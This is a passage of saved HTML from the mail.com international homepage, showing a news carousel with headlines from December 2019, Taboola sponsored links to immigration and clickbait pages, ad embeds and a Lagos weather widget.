<div class="slide" style="width: 620px;"><a href="https://api.taboola.com/1.2/json/1and1internet-mailcom/recommendations.notify-click?app.type=desktop&amp;app.apikey=5c59a26de4617f5f8a5d93b01540559edc1a9fe2&amp;response.id=__dce68cafafc64993c155c2177a6f950b__961134a751cc9abcc100dc1e1e9bf7ca&amp;response.session=v2_d504056ea88b825b95fc6a28a5b12055_ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1_1576780143_1576780143_CIi3jgYQ49pCGP22rvvxLSABKAMwnwE4k4YMQPaWEEiz0idQ____________AVgAYAg&amp;item.id=%7E%7EV1%7E%7E-8958663177305208850%7E%7E3BNJMvMIuRbE4WNM8Igixz1TK-cxXUoVkcbC9HUEDpTTxvAnL2wqac4MyzR7uD46gj3kUkbS3FhelBtnsiJV6MhkDZRZzzIqDobN6rWmCPApXmltpkjV8nqkGhDxOMTMAyK3D58jTeJsXcnbccy9IcrQuRiJO3m1f2Zf64fu-8w2cwVjQBphw1IMOCkivXnsTS8Maux2jWC1gRU3nx5A7kchcA-V62U9N99J9-T6Zbk&amp;item.type=text&amp;sig=046212d07851958c7173038f243dc33843e5484c0e17&amp;redir=http%3A%2F%2Flp.immiproaustralia.com.au%2FAIP%2Fyou_should_be%3Futm_lang%3Den%26af%3Daip_2659%26utm_medium%3DNigeria_Desktop_English%26utm_subid2%3D1092963_156693600&amp;ui=ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1" target="_blank"><img class="taboola-slide-img" src="files/http___cdn.taboola.com_libtrc_static_thumbnails_GETTY_IMAGES_SKP_882850612__G5D8Fm1I.jpg"><div class="slide-headline taboola-source"><p class="taboola-text"><span class="taboola-brand">Australia Immigration Professionals</span><span class="taboola-sponsored">&nbsp; SPONSORED BY TABOOLA</span></p><div class="text">Check if you are eligible to participate in the Australian skilled immigration program!</div></div></a></div>
<div class="slide" style="width: 620px;">
  <a href="https://www.mail.com/int/news/world/9612710-russian-security-officer-dead-5-injured-moscow-sho.html#.1258-stage-hero1-5" target="_top"><img alt="" crossorigin="anonymous" src="files/jpg(4)" srcset="https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-card-l-tall/.jpg 620w, https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-card-xl-tall/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 620px, (min-width:1024px) 620px"><div class="slide-headline">
      <div class="text">Russian security officer dead, 5 injured in Moscow shooting</div>
    </div>
  </a></div>
<div class="slide" style="width: 620px;"><a href="https://api.taboola.com/1.2/json/1and1internet-mailcom/recommendations.notify-click?app.type=desktop&amp;app.apikey=5c59a26de4617f5f8a5d93b01540559edc1a9fe2&amp;response.id=__dce68cafafc64993c155c2177a6f950b__961134a751cc9abcc100dc1e1e9bf7ca&amp;response.session=v2_d504056ea88b825b95fc6a28a5b12055_ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1_1576780143_1576780143_CIi3jgYQ49pCGP22rvvxLSABKAMwnwE4k4YMQPaWEEiz0idQ____________AVgAYAg&amp;item.id=%7E%7EV1%7E%7E9122395067192133664%7E%7EqbMvTux7f4C7nOPE1qQJPd8aLSKsC9c-y4AALBdHmxnTxvAnL2wqac4MyzR7uD46gj3kUkbS3FhelBtnsiJV6MhkDZRZzzIqDobN6rWmCPDwNm0jBKyY-R0L3mzsokbUYzA5G_jT-EZPw9ryDNP0u2Oj5E43VEqrBfxbBJqrZE_30TaXBVNU5jGMEbeGFMvtTS8Maux2jWC1gRU3nx5A7kchcA-V62U9N99J9-T6Zbk&amp;item.type=text&amp;sig=e9aa873a7962472360db9b4f06d245f75e885dff010e&amp;redir=https%3A%2F%2Flp.canadaimmigrationexpress.com%2Fcie%2Famazing_life%3Futm_lang%3Den%26af%3Dcie_2783%26utm_subid2%3Dad_6%26utm_medium%3D1and1internet-mailcom&amp;ui=ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1" target="_blank"><img class="taboola-slide-img" src="files/http___cdn.taboola.com_libtrc_static_thumbnails_GETTY_IMAGES_FKF_1093556074__iAzG99Dn.jpg"><div class="slide-headline taboola-source"><p class="taboola-text"><span class="taboola-brand">Canada Immigration Express</span><span class="taboola-sponsored">&nbsp; SPONSORED BY TABOOLA</span></p><div class="text">Moving to Canada is The best choice for you and your family!</div></div></a></div>
<div class="slide" style="width: 620px;">
  <a href="https://www.mail.com/int/news/europe/9612812-4-to-stand-trial-train-attack-thwarted-americans.html#.1258-stage-hero1-7" target="_top"><img alt="" crossorigin="anonymous" src="files/jpg(5)" srcset="https://i0.mail.com/mcom/814/9612814%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/814/9612814%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/814/9612814%2Cpd=1%2Cf=teaser-card-l-tall/.jpg 620w, https://i0.mail.com/mcom/814/9612814%2Cpd=1%2Cf=teaser-card-xl-tall/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 620px, (min-width:1024px) 620px"><div class="slide-headline">
      <div class="text">4 to stand trial for IS train attack thwarted by Americans</div>
    </div>
  </a></div>
<div class="slide" style="width: 620px;"><a href="https://api.taboola.com/1.2/json/1and1internet-mailcom/recommendations.notify-click?app.type=desktop&amp;app.apikey=5c59a26de4617f5f8a5d93b01540559edc1a9fe2&amp;response.id=__dce68cafafc64993c155c2177a6f950b__961134a751cc9abcc100dc1e1e9bf7ca&amp;response.session=v2_d504056ea88b825b95fc6a28a5b12055_ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1_1576780143_1576780143_CIi3jgYQ49pCGP22rvvxLSABKAMwnwE4k4YMQPaWEEiz0idQ____________AVgAYAg&amp;item.id=%7E%7EV1%7E%7E1782268012253645016%7E%7E5NAn7LFF5MtHIsk13eUR6HrakNyBJGYq3ZPdifWc8T3TxvAnL2wqac4MyzR7uD46gj3kUkbS3FhelBtnsiJV6MhkDZRZzzIqDobN6rWmCPDEx9Bwvcggkc0eUajmdmYI9BqneXQqeHeZKaVSy3jIWnUurauXoUwmb1HF8A4JSI_uPcj1Jt_jlUXob0D676gUTS8Maux2jWC1gRU3nx5A7hJnTvVpXvuaZl7KvWo355k&amp;item.type=photo&amp;sig=2fbfa09998c91cdc59165d5f6a298520b5f1c7d6a964&amp;redir=http%3A%2F%2Ftops.easyvoyage.co.uk%2Fmost-beautiful-women%2F%3Futm_source%3Dtaboola%26utm_campaign%3Ddesktop-beautiful-women-ww%26utm_medium%3Dcpc%26utm_content%3D1and1internet-mailcom&amp;ui=ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1" target="_blank"><img class="taboola-slide-img" src="files/https___console.brax-cdn.com_creatives_c6786967-b802-4356-9477-e919538f8fa1_women_1000x600_3aa5e884916bbd4e95a258bd112d3983.png"><div class="slide-headline taboola-source"><p class="taboola-text"><span class="taboola-brand">Easyvoyage</span><span class="taboola-sponsored">&nbsp; SPONSORED BY TABOOLA</span></p><div class="text">Is she the most beautiful woman in the world ?</div></div></a></div>
<div class="slide" style="width: 620px;">
  <a href="https://www.mail.com/int/news/world/9612940-pelosi-trumps-dingell-slam-cruelty-wit.html#.1258-stage-hero1-9" target="_top"><img alt="Preview Image" crossorigin="anonymous" src="files/preview-image.jpg" srcset="https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-s/preview-image.jpg 300w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-m/preview-image.jpg 460w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-l-tall/preview-image.jpg 620w, https://i0.mail.com/mcom/942/9612942%2Cpd=1%2Cf=teaser-card-xl-tall/preview-image.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 620px, (min-width:1024px) 620px"><div class="slide-headline">
      <div class="text">Pelosi on Trump's Dingell slam: Cruelty is not wit</div>
    </div>
  </a></div>
<div class="slide" style="width: 620px;"><a href="https://api.taboola.com/1.2/json/1and1internet-mailcom/recommendations.notify-click?app.type=desktop&amp;app.apikey=5c59a26de4617f5f8a5d93b01540559edc1a9fe2&amp;response.id=__dce68cafafc64993c155c2177a6f950b__961134a751cc9abcc100dc1e1e9bf7ca&amp;response.session=v2_d504056ea88b825b95fc6a28a5b12055_ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1_1576780143_1576780143_CIi3jgYQ49pCGP22rvvxLSABKAMwnwE4k4YMQPaWEEiz0idQ____________AVgAYAg&amp;item.id=%7E%7EV1%7E%7E-8602063489395839188%7E%7EhqECbtdgL0Ygr6Zc6ALBY2Gxn-DPW5L8rcdkNWJ-SwDTxvAnL2wqac4MyzR7uD46gj3kUkbS3FhelBtnsiJV6MhkDZRZzzIqDobN6rWmCPAMS-SxvsUuTcs61X6YVfGO9BqneXQqeHeZKaVSy3jIWqWgku0OobS0b9J_266IrcagdsYz8xKAS9dEFSnRDkXFTS8Maux2jWC1gRU3nx5A7kchcA-V62U9N99J9-T6Zbk&amp;item.type=photo&amp;sig=102ddc508307092cc4224a91dce6b4515b89e92e30d4&amp;redir=http%3A%2F%2Fwww.buzznoble.com%2F14-symptoms-cancer-commonly-ignored-harmless%2F%3Futm_source%3Dtaboola%26utm_medium%3D1and1internet-mailcom%26utm_campaign%3Dcance2009_desktopworld&amp;ui=ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1" target="_blank"><img class="taboola-slide-img" src="files/http___cdn.taboola.com_libtrc_static_thumbnails_GETTY_IMAGES_SKP_691315596__KEsVKR2Z.jpg"><div class="slide-headline taboola-source"><p class="taboola-text"><span class="taboola-brand">Buzz Noble</span><span class="taboola-sponsored">&nbsp; SPONSORED BY TABOOLA</span></p><div class="text">14 Cancer Signs And Symptoms You Should Know</div></div></a></div>
<div class="slide" style="width: 620px;">
  <a href="https://www.mail.com/int/news/europe/9612074-eu-court-finds-grounds-airline-damages-spilled-cof.html#.1258-stage-hero1-11" target="_top"><img alt="" crossorigin="anonymous" src="files/jpg(6)" srcset="https://i0.mail.com/mcom/878/9612878%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/878/9612878%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/878/9612878%2Cpd=1%2Cf=teaser-card-l-tall/.jpg 620w, https://i0.mail.com/mcom/878/9612878%2Cpd=1%2Cf=teaser-card-xl-tall/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 620px, (min-width:1024px) 620px"><div class="slide-headline">
      <div class="text">EU court finds grounds for airline damages in spilled coffee</div>
    </div>
  </a></div>
<div class="slide" style="width: 620px;"><a href="https://api.taboola.com/1.2/json/1and1internet-mailcom/recommendations.notify-click?app.type=desktop&amp;app.apikey=5c59a26de4617f5f8a5d93b01540559edc1a9fe2&amp;response.id=__dce68cafafc64993c155c2177a6f950b__961134a751cc9abcc100dc1e1e9bf7ca&amp;response.session=v2_d504056ea88b825b95fc6a28a5b12055_ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1_1576780143_1576780143_CIi3jgYQ49pCGP22rvvxLSABKAMwnwE4k4YMQPaWEEiz0idQ____________AVgAYAg&amp;item.id=%7E%7EV1%7E%7E5147921070047531438%7E%7Epj-yC7CEVQjKIpSxjEr1NZVhu3bF8JEfQwSHH6pKZUXTxvAnL2wqac4MyzR7uD46jxIH0JLoVDPCcLkgG4uslcBwBGgkyfN8MOQBUOcLwnyc0Sc4mUVj3FxTTzCFgFY6dlzTQ_JJnIEcIPZ0ZxLJBc7eKEgdKBaz1fIpdk7oy-46MJg9XRxbGQJHiVqsHu9dCLVuK5fveavYEsdKXY9qxpLbod-k1aOr_SlFSpNKSd3jmMXR03R9NJI3XTNJTzNT&amp;item.type=photo&amp;sig=81fbc65211acc38a2cb250bfb6e71b2ccc899cf42c89&amp;redir=https%3A%2F%2Fwww.rivercombat.com%3Fr%3Dtabrc1wwa01%26utm_source%3Dtaboola%26utm_medium%3Dreferral&amp;ui=ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1" target="_blank"><img class="taboola-slide-img" src="files/http___cdn.taboola.com_libtrc_static_thumbnails_f46dd700c2f89ccdf2866dc97e0cf0a2.jpg"><div class="slide-headline taboola-source"><p class="taboola-text"><span class="taboola-brand">River Combat</span><span class="taboola-sponsored">&nbsp; SPONSORED BY TABOOLA</span></p><div class="text">Play this Game for 1 Minute and see why everyone is addicted</div></div></a></div>
<div class="slide" style="width: 620px;">
  <a href="https://bgr.com/2019/12/19/kasa-smart-plug-price-discounted-amazon-alexa/" target="_blank"><img alt="Kasa-Smart-Wi-Fi-Plug" crossorigin="anonymous" src="files/kasa-smart-wi-fi-plug.jpg" srcset="https://i0.mail.com/mcom/898/9612898%2Cpd=1%2Cf=teaser-card-s/kasa-smart-wi-fi-plug.jpg 300w, https://i0.mail.com/mcom/898/9612898%2Cpd=1%2Cf=teaser-card-m/kasa-smart-wi-fi-plug.jpg 460w, https://i0.mail.com/mcom/898/9612898%2Cpd=1%2Cf=teaser-card-l-tall/kasa-smart-wi-fi-plug.jpg 620w, https://i0.mail.com/mcom/898/9612898%2Cpd=1%2Cf=teaser-card-xl-tall/kasa-smart-wi-fi-plug.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 620px, (min-width:1024px) 620px"><div class="slide-headline">
      <div class="text">Black Friday’s best-selling Alexa smart plugs are under $10 each on Amazon</div>
    </div>
  </a></div>
</div>
  <div class="indicator">7 / 13</div>
  <div class="hero-nav prev"></div>
  <div class="hero-nav next"></div>
</div></div>
  <div class="mod-container">
    <div class="ad-slider">
    <div class="ad-container ad-content mod mod-inviewcheck" id="gpt-banner1" data-init="true" data-adcalled="true" data-google-query-id="CLnMsOOrwuYCFSHFuwgds_IAJA">
  
<div id="google_ads_iframe_/6840/p6840.mail.com/HomePage_1__container__" style="border: 0pt none; display: inline-block; width: 620px; height: 169px;"><iframe frameborder="0" src="files/container.html" id="google_ads_iframe_/6840/p6840.mail.com/HomePage_1" title="3rd party ad content" name="" scrolling="no" marginwidth="0" marginheight="0" width="620" height="169" data-is-safeframe="true" sandbox="allow-forms allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" data-google-container-id="1" style="border: 0px; vertical-align: bottom;" data-load-complete="true"></iframe></div></div></div>
</div>
</div>
    <div class="stage-extra">
        <div class="ad-container ad-content mod mod-inviewcheck" id="gpt-stage-desktop" data-init="true" data-adcalled="true" data-google-query-id="COef5eOrwuYCFT_Guwgd2ogKwA" style="width: 100%; height: 100%; margin: auto; display: block;">
  
<div id="google_ads_iframe_/6840/p6840.mail.com/HomePage_2__container__" style="border: 0pt none; width: 310px;"><div id="primis_container_div" style="display: block; z-index: initial; position: relative; text-align: initial; margin: 0px; padding: 0px; border-width: 0px; height: 601px;"><div id="placeHolder" style="position: relative; overflow: hidden; width: 310px; height: 174px;"><img src="files/placeHolder.png" alt="Primis Player Placeholder" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: auto; height: 100%;"></div><iframe id="primis_playerSekindoSPlayer5dfbc1741eb63" title="Primis Player Videos" scrolling="no" allowfullscreen="" style="border: none; position: fixed; z-index: 5000; top: auto; width: 400px; height: 225px; border-radius: 1px; left: 10px; box-shadow: rgba(0, 0, 0, 0.4) 1px 1px 6px 3px; bottom: 65px;" src="files/saved_resource(4).html"></iframe><iframe scrolling="no" id="sekindoNativeSkinFrameSekindoSPlayer5dfbc1741eb63" style="border: none; margin: 0px; visibility: visible; position: absolute; z-index: 0 !important; top: 0px; left: 0px; width: 310px; max-width: 310px; min-width: 310px; height: 601px; opacity: 1; backface-visibility: hidden;" src="files/saved_resource(5).html"></iframe></div><iframe id="google_ads_iframe_/6840/p6840.mail.com/HomePage_2" title="3rd party ad content" name="google_ads_iframe_/6840/p6840.mail.com/HomePage_2" width="300" height="600" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" data-google-container-id="4" style="border: 0px; vertical-align: bottom; height: 1px; width: 1px;" data-load-complete="true" src="files/saved_resource(6).html"></iframe></div></div><div class="stage-promo" data-theme="mixed"><div class="mod mod-weathertool weathertool" data-serviceurl="/ajax/weather/getWeatherDetail" data-init="true"><div class="hl">Weather</div><div class="current-weather"><div class="cw-icon wi-xxl-86"></div><div class="cw-info"><div class="cw-temp"><span class="cwt-hi">34°</span><span class="cwt-lo">24°</span><span class="unit-switch js-toggle-unit">Show in F°</span></div><div class="cw-city">Lagos, Nigeria</div></div></div><ul class="forecasts"><li class="forecast"><span class="fc-weekday">Fri</span><span class="fc-icon wi-small-66"></span><span class="fc-hi">33°</span><span class="fc-lo">24°</span><span class="fc-desc">Partly Cloudy</span></li><li class="forecast"><span class="fc-weekday">Sat</span><span class="fc-icon wi-small-95"></span><span class="fc-hi">32°</span><span class="fc-lo">24°</span><span class="fc-desc">Isolated Thunderstorms</span></li><li class="forecast"><span class="fc-weekday">Sun</span><span class="fc-icon wi-small-85"></span><span class="fc-hi">33°</span><span class="fc-lo">23°</span><span class="fc-desc">Sunny</span></li><li class="forecast"><span class="fc-weekday">Mon</span><span class="fc-icon wi-small-66"></span><span class="fc-hi">34°</span><span class="fc-lo">22°</span><span class="fc-desc">Partly Cloudy</span></li><li class="forecast"><span class="fc-weekday">Tue</span><span class="fc-icon wi-small-85"></span><span class="fc-hi">33°</span><span class="fc-lo">23°</span><span class="fc-desc">Sunny</span></li></ul></div>
</div></div>
    </div>
<div class="mod-container">
    <div class="container-headline" data-theme="news" id="news">
      <span><a href="https://www.mail.com/int/news/#.1258-stage-set1-1" target="_top">News</a></span>
      <a href="https://www.mail.com/int/news/#.1258-stage-set1-2" target="_top">View More</a></div>
<div class="blocks blocks-3">
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="news" data-init="true">
    <a href="https://www.mail.com/int/news/us/9612644-what-crackdown-migrant-smuggling-business-adapts-t.html#.1258-stage-set1-3" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/664/9612664,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/664/9612664,pd=2,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/664/9612664,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/664/9612664%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px" src="files/jpg(7)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        US</span>
        <div class="teaser-headline">What crackdown? Migrant smuggling business adapts, thrives</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="news" data-init="true">
    <a href="https://www.mail.com/int/news/us/9612618-facebook-to-tackle-efforts-to-interfere-with-2020.html#.1258-stage-set1-4" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/614/9612614,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/614/9612614,pd=2,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/614/9612614,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/614/9612614%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/jpg(8)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        US</span>
        <div class="teaser-headline">Facebook to tackle efforts to interfere with 2020 US census</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
      <div class="mod mod-teaser teaser-list" data-theme="news" data-init="true">
    <a href="https://www.mail.com/int/news/world/9612710-russian-security-officer-dead-5-injured-moscow-sho.html#.1258-stage-set1-5" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/786/9612786,pd=2,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/786/9612786,pd=2,f=teaser-list-s/.jpg" srcset="https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/786/9612786,pd=2,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" class="lazyImg" srcset="https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/786/9612786%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" src="files/jpg(9)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        World</span>
        <div class="teaser-headline">Russian security officer dead, 5 injured in Moscow shooting</div>
</div>
    </div>
</a></div>
<div class="mod mod-teaser teaser-list" data-theme="news" data-init="true">
    <a href="https://www.mail.com/int/news/world/9612900-senate-passes-anti-robocalls-bill-sending-to-trump.html#.1258-stage-set1-6" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/952/9612952,pd=2,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/952/9612952%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/952/9612952%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/952/9612952,pd=2,f=teaser-list-s/.jpg" srcset="https://i0.mail.com/mcom/952/9612952%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/952/9612952%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/952/9612952,pd=2,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/952/9612952%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/952/9612952%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" class="lazyImg" srcset="https://i0.mail.com/mcom/952/9612952%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/952/9612952%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" src="files/jpg(10)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        World</span>
        <div class="teaser-headline">Senate passes anti-robocalls bill, sending it to Trump</div>
</div>
    </div>
</a></div>
</div>
  </div>
</div>
<div class="mod-container">
    <div class="container-headline" data-theme="entertainment" id="entertainment">
      <span><a href="https://www.mail.com/int/entertainment/#.1258-stage-set2-1" target="_top">Entertainment</a></span>
      <a href="https://www.mail.com/int/entertainment/#.1258-stage-set2-2" target="_top">View More</a></div>
<div class="blocks blocks-5">
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="entertainment" data-init="true">
